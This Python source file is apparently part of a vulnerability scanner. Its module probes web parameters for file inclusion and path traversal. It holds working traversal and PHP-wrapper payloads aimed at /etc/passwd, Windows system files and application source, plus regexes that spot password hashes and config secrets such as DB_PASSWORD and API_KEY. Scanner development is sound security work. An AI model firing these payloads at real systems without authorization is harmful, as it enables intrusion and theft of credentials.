"""
XLayer AI LFI Hunter - Detects Local/Remote File Inclusion vulnerabilities
"""

import re
import time
from typing import List, Optional, Dict, Any
from loguru import logger

from xlayer_hunter.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_hunter.models.target import AttackSurface, Endpoint
from xlayer_hunter.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)
from xlayer_hunter.tools.payload_manager import PayloadCategory


class LFIHunter(BaseHunter):
    """
    Local/Remote File Inclusion Hunter
    
    Detects:
    - Local File Inclusion (LFI)
    - Remote File Inclusion (RFI)
    - Path Traversal
    - PHP wrapper exploitation
    """
    
    name = "lfi"
    vuln_types = [VulnType.LFI, VulnType.RFI, VulnType.PATH_TRAVERSAL]
    
    FILE_SIGNATURES = {
        "linux_passwd": [
            r"root:.*:0:0:",
            r"daemon:.*:1:1:",
            r"bin:.*:2:2:",
            r"nobody:.*:65534:",
            r"/bin/bash",
            r"/bin/sh",
            r"/sbin/nologin",
        ],
        "linux_hosts": [
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
        ],
        "linux_shadow": [
            r"root:\$[0-9a-z]+\$",
            r":\d+:\d+:\d+:\d+:",
        ],
        "windows_hosts": [
            r"127\.0\.0\.1\s+localhost",
            r"# Copyright \(c\) .* Microsoft",
        ],
        "windows_ini": [
            r"\[boot loader\]",
            r"\[operating systems\]",
            r"multi\(0\)disk\(0\)",
        ],
        "php_source": [
            r"<\?php",
            r"<\?=",
            r"function\s+\w+\s*\(",
            r"\$_GET\[",
            r"\$_POST\[",
            r"\$_REQUEST\[",
        ],
        "config_files": [
            r"DB_HOST",
            r"DB_PASSWORD",
            r"SECRET_KEY",
            r"API_KEY",
            r"database\.password",
            r"mysql\.password",
        ]
    }
    
    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        """Hunt for file inclusion vulnerabilities"""
        start_time = time.time()
        self._reset_state()
        
        logger.info(f"LFI Hunter starting")
        
        file_params = self._find_file_parameters(attack_surface)
        
        os_type = self._detect_os(attack_surface)
        
        for endpoint, param_name in file_params:
            hypotheses = await self._test_lfi(endpoint, param_name, os_type)
            self._hypotheses.extend(hypotheses)
        
        duration = time.time() - start_time
        result = self._build_result(duration)
        
        logger.info(
            f"LFI Hunter complete: {result.findings_count} hypotheses, "
            f"{result.high_confidence_count} high confidence"
        )
        
        return result
    
    def _find_file_parameters(self, attack_surface: AttackSurface) -> List[tuple]:
        """Find parameters that might accept file paths"""
        file_params = []
        
        file_param_names = [
            "file", "path", "page", "include", "template", "doc",
            "document", "folder", "root", "dir", "directory",
            "load", "read", "content", "filename", "filepath",
            "view", "cat", "action", "module", "lang", "language",
            "theme", "skin", "style", "layout", "config"
        ]
        
        for endpoint in attack_surface.testable_endpoints:
            for param in endpoint.parameters:
                param_lower = param.name.lower()
                
                if any(f in param_lower for f in file_param_names):
                    file_params.append((endpoint, param.name))
                
                elif param.sample_value:
                    if any(ext in param.sample_value.lower() for ext in [".php", ".html", ".txt", ".inc", ".tpl"]):
                        file_params.append((endpoint, param.name))
        
        return file_params
    
    def _detect_os(self, attack_surface: AttackSurface) -> str:
        """Detect target OS from attack surface"""
        tech = attack_surface.technology
        
        if tech.server:
            if "iis" in tech.server.lower():
                return "windows"
        
        if tech.os:
            if "windows" in tech.os.lower():
                return "windows"
        
        return "linux"
    
    async def _test_lfi(
        self,
        endpoint: Endpoint,
        parameter: str,
        os_type: str
    ) -> List[VulnHypothesis]:
        """Test for LFI vulnerabilities"""
        hypotheses = []
        self._endpoints_tested += 1
        
        lfi_payloads = self.payloads.get_lfi_payloads(os_type=os_type)
        
        if os_type == "linux":
            test_payloads = [
                ("../../../etc/passwd", "linux_passwd"),
                ("....//....//....//etc/passwd", "linux_passwd"),
                ("..%2F..%2F..%2Fetc%2Fpasswd", "linux_passwd"),
                ("....//....//....//etc/hosts", "linux_hosts"),
                ("/etc/passwd", "linux_passwd"),
                ("php://filter/convert.base64-encode/resource=index.php", "php_source"),
                ("php://filter/read=string.rot13/resource=index.php", "php_source"),
            ]
        else:
            test_payloads = [
                ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows_hosts"),
                ("....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts", "windows_hosts"),
                ("..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts", "windows_hosts"),
                ("C:\\boot.ini", "windows_ini"),
                ("C:\\windows\\win.ini", "windows_ini"),
            ]
        
        null_byte_payloads = [
            ("../../../etc/passwd%00", "linux_passwd"),
            ("../../../etc/passwd\x00", "linux_passwd"),
        ]
        
        all_payloads = test_payloads + null_byte_payloads
        
        for payload, expected_type in all_payloads:
            self._payloads_sent += 1
            
            response = await self._send_payload(endpoint, parameter, payload)
            
            if not response or response.get("error"):
                continue
            
            body = response["body"]
            
            file_type, indicators = self._analyze_file_response(body, expected_type)
            
            if file_type:
                confidence = Confidence.HIGH
                
                vuln_type = VulnType.LFI
                if "php://" in payload:
                    vuln_type = VulnType.LFI
                
                hypothesis = self._create_hypothesis(
                    vuln_type=vuln_type,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=confidence,
                    indicators=indicators,
                    suggested_payloads=[payload],
                    context={
                        "file_type": file_type,
                        "payload": payload,
                        "os_type": os_type,
                        "traversal_depth": payload.count("../") or payload.count("..\\")
                    }
                )
                hypotheses.append(hypothesis)
                break
        
        if not hypotheses:
            traversal_hypothesis = await self._test_path_traversal(endpoint, parameter, os_type)
            if traversal_hypothesis:
                hypotheses.append(traversal_hypothesis)
        
        return hypotheses
    
    def _analyze_file_response(
        self,
        body: str,
        expected_type: str
    ) -> tuple:
        """Analyze response for file content indicators"""
        signatures = self.FILE_SIGNATURES.get(expected_type, [])
        
        for pattern in signatures:
            if re.search(pattern, body, re.IGNORECASE):
                indicators = [
                    VulnIndicator(
                        indicator_type="file_content",
                        detail=f"Found {expected_type} content: {pattern[:30]}",
                        confidence_boost=0.3
                    )
                ]
                return expected_type, indicators
        
        for file_type, patterns in self.FILE_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    indicators = [
                        VulnIndicator(
                            indicator_type="file_content",
                            detail=f"Found {file_type} content",
                            confidence_boost=0.25
                        )
                    ]
                    return file_type, indicators
        
        return None, []
    
    async def _test_path_traversal(
        self,
        endpoint: Endpoint,
        parameter: str,
        os_type: str
    ) -> Optional[VulnHypothesis]:
        """Test for path traversal without full LFI"""
        baseline_response = await self._send_payload(endpoint, parameter, "test")
        if not baseline_response:
            return None
        
        baseline_length = len(baseline_response["body"])
        baseline_status = baseline_response["status"]
        
        traversal_payloads = [
            "../",
            "..\\",
            "....//",
            "..%2F",
            "..%5C",
        ]
        
        for payload in traversal_payloads:
            self._payloads_sent += 1
            
            response = await self._send_payload(endpoint, parameter, payload * 5)
            
            if not response:
                continue
            
            if response["status"] != baseline_status:
                continue
            
            response_length = len(response["body"])
            
            if abs(response_length - baseline_length) > 100:
                indicators = [
                    VulnIndicator(
                        indicator_type="path_traversal",
                        detail=f"Response changed with traversal payload",
                        confidence_boost=0.1
                    )
                ]
                
                return self._create_hypothesis(
                    vuln_type=VulnType.PATH_TRAVERSAL,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=Confidence.LOW,
                    indicators=indicators,
                    suggested_payloads=[payload * 5],
                    context={
                        "payload": payload,
                        "baseline_length": baseline_length,
                        "response_length": response_length
                    }
                )
        
        return None
    
    def _analyze_response(
        self,
        endpoint: Endpoint,
        parameter: str,
        payload: str,
        response: Dict[str, Any]
    ) -> Optional[VulnHypothesis]:
        """Analyze response for LFI indicators"""
        return None
